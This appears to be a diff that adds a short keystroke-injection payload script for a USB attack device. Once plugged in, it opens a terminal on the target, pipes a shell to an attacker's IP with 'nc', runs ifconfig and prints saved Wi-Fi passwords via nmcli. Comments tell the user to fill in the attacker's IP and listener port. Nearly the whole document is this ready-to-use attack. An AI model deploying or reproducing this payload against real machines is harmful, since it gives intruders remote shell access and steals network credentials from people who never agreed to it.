@@ -1,0 +1,26 @@
+REM:Created by D3PR4V3D on github
+
+REM: change "qterminal" to the terminal application for target's OS
+REM: replace "0.0.0.0" with attackers ip and "5000" with listener port
+
+Press:134+195
+
+PrintLine:qterminal
+
+CustomDelay:1000
+
+PrintLine:/bin/sh | nc 0.0.0.0 5000
+
+CustomDelay: 1000
+
+PrintLine:ifconfig
+
+CustomDelay:500
+
+PrintLine:nmcli device wifi show-password
+
+CustomDelay:1000
+
+PrintLine: exit
+
+BlinkLED:3
